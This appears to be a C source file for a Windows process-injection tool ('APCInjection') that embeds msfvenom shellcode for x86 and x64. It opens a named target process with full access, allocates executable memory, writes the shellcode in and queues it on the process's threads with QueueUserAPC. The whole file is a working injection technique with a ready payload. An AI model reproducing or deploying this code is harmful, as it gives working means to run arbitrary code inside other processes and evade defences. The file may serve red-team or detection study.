#include "stdafx.h"
#include "general.h"
#include <psapi.h>
#include <stdio.h>
#include <Windows.h>
#include <tlhelp32.h>
#include <strsafe.h>

#ifdef _X86_
//msfvenom -a x86 --platform windows -p windows/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x68\xa6\x95\xbd\x9d\xff\xd5"
"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a"
"\x00\x53\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

#endif

#ifdef _WIN64
//msfvenom -a x64 --platform windows -p windows/x64/exec CMD="cmd.exe" EXITFUNC=thread -f c
unsigned char sc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
"\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
"\x2e\x65\x78\x65\x00";
#endif

int wmain(int argc, wchar_t**argv) //to read in arguments as unicode
{
	if (argc != 2)
	{
		printf("Usage: APCInjection.exe [process name]\r\n");
		return -1;
	}

	//find the process ID by name
	DWORD pid = FindPIDByName(argv[1]);
	printf("[+] PID is: %Id,0x%Ix\n", (SIZE_T)pid, (SIZE_T)pid);

	//open process with all access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//printf("[-] Couldn't open process, exiting...\n");
		//return -1;
		ErrorExit(TEXT("OpenProcess"));
	}
	printf("[+] Process handle: 0x%Ix\n", (SIZE_T)hProcess);

	//allocate memory in target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL)
	{
		ErrorExit(TEXT("VirtualAllocEx"));
	}
	printf("[+] Allocated memory address in target process is: 0x%Ix\n", (SIZE_T)lpBaseAddress);


	//write SC to target process
	SIZE_T *lpNumberOfBytesWritten = 0;
	BOOL resWPM = WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)sc, sizeof(sc), lpNumberOfBytesWritten);
	if (!resWPM)
	{
		ErrorExit(TEXT("WriteProcessMemory"));
	}
	printf("[+] Shellcode is written to memory of target process\n");


	printf("[*] Finding a thread to queue APC in the given process\r\n");
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
	{
		ErrorExit(TEXT("CreateToolhelp32Snapshot"));
	}

	THREADENTRY32 te32;
	te32.dwSize = sizeof(te32);
	DWORD tid = 0;

	if (!Thread32First(hSnapshot, &te32))
	{
		ErrorExit(TEXT("Thread32First"));
	}

	while (Thread32Next(hSnapshot, &te32))
	{
		if (te32.th32OwnerProcessID == pid)
		{
			printf("[+] Found thread in target process\r\n");
			HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
			tid = te32.th32ThreadID;
			if (!hThread)
			{
				printf("[-] Couldn't open thread:  0x%Ix, trying next one...\r\n", (SIZE_T)hThread);
				continue;
			}
			printf("[+] Thread handle: 0x%Ix\r\n", (SIZE_T)hThread);
			if (!QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL))
			{
				printf("[-] QueueUserAPC error, trying next thread...\r\n");
			}
			else
			{
				printf("[+] Shellcoded ijected via QueueUserAPC\r\n");
			}
			CloseHandle(hThread);
		}
	}

	if (!tid)
	{
		printf("[-] No threads were found in target process\r\n");
	}

	CloseHandle(hSnapshot);
	CloseHandle(hProcess);
	return 0;
}

